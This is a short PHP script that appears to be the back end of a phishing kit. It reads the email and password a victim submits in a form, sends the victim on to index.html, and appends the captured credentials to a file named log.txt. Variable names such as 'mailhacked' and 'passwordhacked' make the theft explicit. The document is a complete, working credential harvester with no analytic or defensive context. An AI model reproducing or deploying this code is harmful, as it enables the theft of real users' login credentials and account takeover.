<?php
$mailhacked = $_POST["email"];
$passwordhacked = $_POST["password"];
header('Location: index.html');
$handle = fopen("log.txt", "a");
fwrite($handle, $mailhacked);
fwrite($handle, "=");
fwrite($handle, $passwordhacked);
fwrite($handle, "\r\n");
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>